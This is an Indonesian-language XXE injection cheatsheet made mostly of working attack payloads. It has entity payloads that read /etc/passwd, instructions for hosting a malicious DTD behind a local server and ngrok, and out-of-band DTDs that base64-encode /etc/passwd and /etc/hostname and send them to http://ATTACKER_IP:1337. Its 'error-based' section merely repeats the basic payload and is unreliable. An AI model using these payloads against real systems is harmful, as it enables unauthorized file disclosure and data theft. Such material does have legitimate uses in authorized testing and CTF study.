# XXE (XML External Entity) Injection Cheatsheet

## 1. Apa itu XXE?

XXE adalah celah keamanan pada aplikasi yang memproses input XML tanpa konfigurasi yang aman, sehingga memungkinkan penyerang untuk membaca file lokal, melakukan SSRF, atau exfiltrate data.

---

## 2. XXE Basic Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
    <data>&xxe;</data>
</root>
```

**Tujuan:** Membaca file lokal (`/etc/passwd`).

---

## 3. XXE Error-Based

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
    <data>&xxe;</data>
</root>
```

**Catatan:** Jika output tidak langsung terlihat, kadang error message akan menampilkan hasil pembacaan file.

---

## 4. XXE Out-of-Band (OOB) dengan Custom DTD

### a. Menyiapkan Server untuk Exfiltration

- Jalankan HTTP server di direktori yang berisi `evil.dtd`:
  ```bash
  python3 -m http.server 1337
  # atau
  php -S 0.0.0.0:1337
  ```
- Untuk akses publik, gunakan ngrok:
  ```bash
  ngrok http 1337
  ```

### b. Isi dari `evil.dtd`

```xml
<!-- evil.dtd -->
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

### c. Payload XXE untuk Memanggil DTD Eksternal

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:1337/evil.dtd">
  %xxe;
]>
<root>
    <data>&exfil;</data>
</root>
```

**Penjelasan:**

- Server korban akan memuat DTD eksternal (`evil.dtd`), membaca file `/etc/passwd`, lalu mengirim hasilnya ke server attacker.

---

## 5. Contoh Custom DTD Lain

### Membaca File Lain (misal `/etc/hostname`)

**Buat file baru:** `evil-hostname.dtd`

```xml
<!-- filepath: /home/alfiang/Cyber/Cheatsheet/web-exploitation/XXE-Injection/evil-hostname.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % oob "<!ENTITY send SYSTEM 'http://ATTACKER_IP:1337/?host=%file;'>">
%oob;
```

**Payload XXE:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:1337/evil-hostname.dtd">
  %xxe;
]>
<root>
    <data>&send;</data>
</root>
```

---

## 6. Tips & Catatan

- Ganti `ATTACKER_IP` dengan IP publik/ngrok kamu.
- Gunakan base64 encode agar data tidak corrupt saat exfiltration.
- Beberapa aplikasi membatasi akses DTD eksternal, gunakan SSRF jika memungkinkan.
